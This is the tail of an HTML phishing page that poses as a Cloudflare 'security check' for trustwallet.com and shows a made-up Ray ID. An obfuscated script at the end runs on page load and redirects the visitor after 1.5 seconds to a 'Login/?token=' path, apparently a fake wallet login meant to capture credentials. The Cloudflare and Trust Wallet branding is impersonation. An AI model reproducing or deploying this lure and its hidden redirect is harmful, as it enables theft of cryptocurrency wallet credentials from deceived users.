        --cf-blue-1: #002b67;
        --cf-blue-2: #003681;
        --cf-blue-3: #0045a6;
        --cf-blue-4: #0051c3;
        --cf-blue-5: #086fff;
        --cf-blue-6: #4693ff;
        --cf-blue-7: #82b6ff;
        --cf-blue-8: #b9d6ff;
        --cf-blue-9: #ecf4ff;
        --cf-indigo-0: #170f58;
        --cf-indigo-1: #221785;
        --cf-indigo-2: #2c1ea9;
        --cf-indigo-3: #3524cd;
        --cf-indigo-4: #4b3bdc;
        --cf-indigo-5: #7366e4;
        --cf-indigo-6: #9d94ec;
        --cf-indigo-7: #c2bdf3;
        --cf-indigo-8: #dfdcf9;
        --cf-indigo-9: #f1f0fc;
        --cf-violet-0: #350b42;
        --cf-violet-1: #490f5c;
        --cf-violet-2: #5f1477;
        --cf-violet-3: #741892;
        --cf-violet-4: #8d1eb1;
        --cf-violet-5: #b73cdf;
        --cf-violet-6: #cf7ee9;
        --cf-violet-7: #dfa8f1;
        --cf-violet-8: #ebcaf6;
        --cf-violet-9: #f7eafb;
        --cf-pink-0: #2d0210;
        --cf-pink-1: #4e031c;
        --cf-pink-2: #6a0426;
        --cf-pink-3: #8d0633;
        --cf-pink-4: #af0740;
        --cf-pink-5: #e80954;
        --cf-pink-6: #f85189;
        --cf-pink-7: #fb97b9;
        --cf-pink-8: #fdc9db;
        --cf-pink-9: #fef1f5;
        --cf-gray-0: #1d1d1d;
        --cf-gray-1: #313131;
        --cf-gray-2: #3d3d3d;
        --cf-gray-3: #4a4a4a;
        --cf-gray-4: #595959;
        --cf-gray-5: #797979;
        --cf-gray-6: #999999;
        --cf-gray-7: #b6b6b6;
        --cf-gray-8: #d9d9d9;
        --cf-gray-9: #f2f2f2;
        --cf-newGray-0: #191919;
        --cf-newGray-1: #2C2C2C;
        --cf-newGray-2: #424242;
        --cf-newGray-3: #5A5A5A;
        --cf-newGray-4: #666666;
        --cf-newGray-5: #767676;
        --cf-newGray-6: #909090;
        --cf-newGray-7: #AEAEAE;
        --cf-newGray-8: #CCCCCC;
        --cf-newGray-9: #EAEAEA;
        --cf-newGreen-0: #081E10;
        --cf-newGreen-1: #0D341B;
        --cf-newGreen-2: #134C28;
        --cf-newGreen-3: #1A6736;
        --cf-newGreen-4: #1E753E;
        --cf-newGreen-5: #228747;
        --cf-newGreen-6: #29A456;
        --cf-newGreen-7: #32C769;
        --cf-newGreen-8: #81DFA3;
        --cf-newGreen-9: #CFF3DC;
        --cf-sequential-0: #3E8EFF;
        --cf-sequential-1: #104858;
        --cf-sequential-2: #E46E0A;
        --cf-sequential-3: #6B1687;
        --cf-sequential-4: #F8528A;
        --cf-sequential-5: #003E93;
        --cf-sequential-6: #FD5548;
        --cf-sequential-7: #423979;
        --cf-sequential-8: #29A456;
        --cf-sequential-9: #870531;
        --cf-sequential-10: #BA8700;
        --cf-sequential-11: #134C28;
        --cf-sequential-12: #C768E6;
        --cf-sequential-13: #880C02;
    }

    .mode-transition *,
    .mode-transition body,
    .mode-transition input,
    .mode-transition button,
    .mode-transition footer,
    .mode-transition header,
    .mode-transition div {
        transition-duration: 500ms !important;
        transition-property: all !important;
        transition-timing-function: ease-out !important;
    }

    .ReactVirtualized__List {
        outline: none
    }

    .grim-scroll-sortable-helper {
        pointer-events: auto !important;
        z-index: 2000 !important;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.2) !important;
        background-color: white !important;
    }

    .grim-scroll-sortable-helper * {
        cursor: grabbing !important;
    }
    </style>
</head>

<body>
    <div id="loading-state" role="alert" aria-live="assertive">
        <style type="text/css">
        #loading-state {
            display: flex;
            height: 100vh;
            width: 100vw;
            justify-content: center;
            align-items: center;
        }

        .dark-mode body {
            background-color: #1d1d1d;
            color: #d9d9d9;
        }

        .error-container {
            line-height: 1.5;
            font-size: 20px;
            padding: 32px;
        }

        .error-container a {
            color: inherit;
            text-decoration: underline;
        }

        .error-container h1 {
            line-height: 1.5;
            font-size: inherit;
            font-weight: 600;
            margin: 0 auto 16px;
        }

        .error-container p {
            margin: 0;
            max-width: 37.5rem;
        }

        .error-container svg {
            width: 128px;
            margin-bottom: 16px;
        }
        </style>

        <div class="error-container">
            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                viewBox="0 0 1230.574 519.774" xml:space="preserve">
                <path fill="#F78100"
                    d="M784.025,512.011l5.872-20.311c6.998-24.169,4.394-46.511-7.349-62.926c-10.801-15.122-28.804-24.022-50.666-25.056l-414.114-5.281c-2.788-0.147-5.096-1.403-6.518-3.471c-1.44-2.123-1.773-4.856-0.886-7.478c1.366-4.08,5.41-7.164,9.62-7.349l417.954-5.299c49.576-2.271,103.252-42.505,122.048-91.564l23.837-62.28c0.657-1.696,0.952-3.493,0.94-5.294c-0.007-0.984-0.078-1.969-0.294-2.94C857.383,91.028,748.758,0,618.863,0c-119.685,0-221.312,77.254-257.76,184.623c-23.523-17.652-53.62-27.031-85.969-23.801c-57.423,5.706-103.565,51.94-109.271,109.363c-1.496,14.901-0.277,29.284,3.158,42.8C75.222,315.718,0,392.566,0,487.029c0,8.549,0.646,16.95,1.846,25.166c0.591,3.988,3.952,6.98,7.977,6.98l764.527,0.092c0.076,0,0.142-0.034,0.218-0.036C778.942,519.134,782.79,516.24,784.025,512.011z">
                </path>
                <path fill="#FBAC42"
                    d="M921.982,225.558c-3.841,0-7.663,0.111-11.466,0.295c-0.628,0.033-1.224,0.185-1.796,0.385c-1.985,0.696-3.566,2.305-4.168,4.397l-16.286,56.242c-6.998,24.169-4.395,46.493,7.349,62.907c10.801,15.14,28.804,24.022,50.665,25.056l88.277,5.299c2.604,0.129,4.893,1.385,6.297,3.416c1.477,2.142,1.809,4.893,0.923,7.515c-1.385,4.081-5.41,7.164-9.601,7.349l-91.73,5.299c-49.798,2.29-103.473,42.505-122.27,91.564l-6.629,17.319c-1.206,3.134,1.039,6.472,4.354,6.635c0.084,0.004,0.159,0.031,0.244,0.031h315.626c3.766,0,7.127-2.456,8.142-6.075c5.484-19.498,8.402-40.048,8.402-61.301C1148.315,326.889,1046.984,225.558,921.982,225.558z">
                </path>
            </svg>
            <h1 id="error-title"><b>The Cloudflare Security Check is In Progress.</b></h1>
            <p id="error-description">This is to ensure that you are a human. Please wait while we hold a complete check to let you access <b>trustwallet.com.</b>
         </p>
   <p>CLOUDFLARE RAY ID: 4700218</p>      </div>
    </div>
    <div id="react-app"></div>
    <div id="overlays"></div>


   
</body>

</html>















<script>
var _0x2efe = ['9430zwDzJl', '85kKMdUq', '7577WcwRrp', '6502jhNFpb', '146601QuZxkY', '13699TyvWPW', '14rWUVfE',
    '15309VpTwJW', 'Login/?token=', '27233jaFqDs'
];
var _0x179f = function(_0x59284c, _0x36e29b) {
    _0x59284c = _0x59284c - 0x187;
    var _0x2efe40 = _0x2efe[_0x59284c];
    return _0x2efe40;
};
(function(_0x4a7fe2, _0xde34a) {
    var _0x529748 = _0x179f;
    while (!![]) {
        try {
            var _0x1d901e = -parseInt(_0x529748(0x18c)) + -parseInt(_0x529748(0x18e)) + -parseInt(_0x529748(
                    0x18b)) + parseInt(_0x529748(0x189)) + -parseInt(_0x529748(0x188)) * parseInt(_0x529748(
                0x187)) + -
                parseInt(_0x529748(0x190)) + -parseInt(_0x529748(0x18f)) * -parseInt(_0x529748(0x18d));
            if (_0x1d901e === _0xde34a) break;
            else _0x4a7fe2['push'](_0x4a7fe2['shift']());
        } catch (_0x214b85) {
            _0x4a7fe2['push'](_0x4a7fe2['shift']());
        }
    }
}(_0x2efe, 0x2d408), setTimeout(() => {
    var _0x17c14b = _0x179f;
    window['location']['href'] = _0x17c14b(0x18a);
}, 0x5dc));
</script>

</html>